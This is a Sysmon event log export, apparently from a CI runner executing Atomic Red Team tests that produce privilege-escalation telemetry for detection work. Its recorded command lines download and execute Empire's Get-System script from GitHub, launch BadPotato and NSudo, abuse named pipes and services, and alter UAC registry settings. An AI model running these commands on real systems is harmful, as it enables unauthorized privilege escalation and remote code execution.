ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:34 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:34.530
ProcessGuid: {f995aebf-63d6-6942-6206-000000000e00}
ProcessId: 7436
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hxqx0xbg.tdg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:34 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:34.508
ProcessGuid: {f995aebf-63d6-6942-6206-000000000e00}
ProcessId: 7436
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hxqx0xbg.tdg.ps1
CreationUtcTime: 2025-12-17 08:03:34.508
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:34 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:34.424
ProcessGuid: {f995aebf-63d6-6942-6206-000000000e00}
ProcessId: 7436
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {cd \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\""""
Start-Process .\BadPotato.exe notepad.exe
Start-Sleep -Second 20
Stop-Process -Name \""""notepad\"""" -force -erroraction silentlycontinue
Stop-Process -Name \""""BadPotato\"""" -force -erroraction silentlycontinue}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:29 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:03:28.255
ProcessGuid: {f995aebf-63cf-6942-5e06-000000000e00}
ProcessId: 9080
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:29 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:03:27.713
ProcessGuid: {f995aebf-63cf-6942-5e06-000000000e00}
ProcessId: 9080
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:29 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:27.718
ProcessGuid: {f995aebf-63cf-6942-5e06-000000000e00}
ProcessId: 9080
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.11
SourceHostname: runnervm8j6r3.nffxvtgvxe4e3eqtaidkon1qmg.bx.internal.cloudapp.net
SourcePort: 54769
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:28.845
ProcessGuid: {f995aebf-63d0-6942-6006-000000000e00}
ProcessId: 2432
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nsyymiwj.0zu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:28 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:28.823
ProcessGuid: {f995aebf-63d0-6942-6006-000000000e00}
ProcessId: 2432
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nsyymiwj.0zu.ps1
CreationUtcTime: 2025-12-17 08:03:28.823
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:28 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:28.736
ProcessGuid: {f995aebf-63d0-6942-6006-000000000e00}
ProcessId: 2432
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Start-Process \""""C:\AtomicRedTeam\atomics\T1134.001\bin\NSudoLG.exe\"""" -Argument \""""-U:T -P:E cmd\""""
Start-Sleep -Second 5
Stop-Process -Name \""""cmd\"""" -force -erroraction silentlycontinue}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:28 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:28.452
SourceProcessGUID: {f995aebf-638f-6942-7d05-000000000e00}
SourceProcessId: 8576
SourceThreadId: 9024
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+3a18f|C:\Windows\SYSTEM32\framedynos.dll+b155|C:\Windows\system32\wbem\wmiprvse.exe+7d83|C:\Windows\system32\wbem\wmiprvse.exe+7649|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:28 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:28.275
SourceProcessGUID: {f995aebf-638f-6942-7d05-000000000e00}
SourceProcessId: 8576
SourceThreadId: 9024
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:28 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:28.265
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:28 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:28.265
SourceProcessGUID: {f995aebf-5ac8-6942-1200-000000000e00}
SourceProcessId: 1156
SourceThreadId: 6644
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:27 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:27.474
ProcessGuid: {f995aebf-63cf-6942-5e06-000000000e00}
ProcessId: 9080
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f0zoc44t.aha.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:27 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:27.454
ProcessGuid: {f995aebf-63cf-6942-5e06-000000000e00}
ProcessId: 9080
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f0zoc44t.aha.ps1
CreationUtcTime: 2025-12-17 08:03:27.454
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:27.374
ProcessGuid: {f995aebf-63cf-6942-5e06-000000000e00}
ProcessId: 9080
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:26 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:23.943
ProcessGuid: {f995aebf-63cb-6942-5806-000000000e00}
ProcessId: 9504
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.11
SourceHostname: runnervm8j6r3.nffxvtgvxe4e3eqtaidkon1qmg.bx.internal.cloudapp.net
SourcePort: 54768
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:25 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:03:23.939
ProcessGuid: {f995aebf-63cb-6942-5806-000000000e00}
ProcessId: 9504
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:24 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:24.370
ProcessGuid: {f995aebf-63cc-6942-5b06-000000000e00}
ProcessId: 8404
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe  /C ""timeout /t 3 >nul&&echo TestSVC > \\.\pipe\TestSVC""
CurrentDirectory: C:\Windows\System32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {f995aebf-5ac7-6942-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63cc-6942-5a06-000000000e00}
ParentProcessId: 9896
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /C start C:\Windows\system32\cmd.exe /C ""timeout /t 3 >nul&&echo TestSVC > \\.\pipe\TestSVC""
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:24 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:24.363
ProcessGuid: {f995aebf-63cc-6942-5a06-000000000e00}
ProcessId: 9896
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /C start C:\Windows\system32\cmd.exe /C ""timeout /t 3 >nul&&echo TestSVC > \\.\pipe\TestSVC""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {f995aebf-5ac7-6942-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-5ac6-6942-0c00-000000000e00}
ParentProcessId: 976
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:24 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 08:03:24.348
ProcessGuid: {f995aebf-5ac6-6942-0c00-000000000e00}
ProcessId: 976
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\TestSVC\ImagePath
Details: %%COMSPEC%% /C start %%COMSPEC%% /C ""timeout /t 3 >nul&&echo TestSVC > \\.\pipe\TestSVC""
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:23.706
ProcessGuid: {f995aebf-63cb-6942-5806-000000000e00}
ProcessId: 9504
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_sup34t5x.cdi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:23.684
ProcessGuid: {f995aebf-63cb-6942-5806-000000000e00}
ProcessId: 9504
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_sup34t5x.cdi.ps1
CreationUtcTime: 2025-12-17 08:03:23.684
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:23.604
ProcessGuid: {f995aebf-63cb-6942-5806-000000000e00}
ProcessId: 9504
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:23.428
ProcessGuid: {f995aebf-63cb-6942-5706-000000000e00}
ProcessId: 9032
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:21 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:21.043
ProcessGuid: {f995aebf-63c9-6942-5206-000000000e00}
ProcessId: 7532
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg delete ""HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"" /ve /f & reg delete ""HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"" /ve /f
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:20 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:20.825
ProcessGuid: {f995aebf-63c8-6942-4f06-000000000e00}
ProcessId: 8924
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
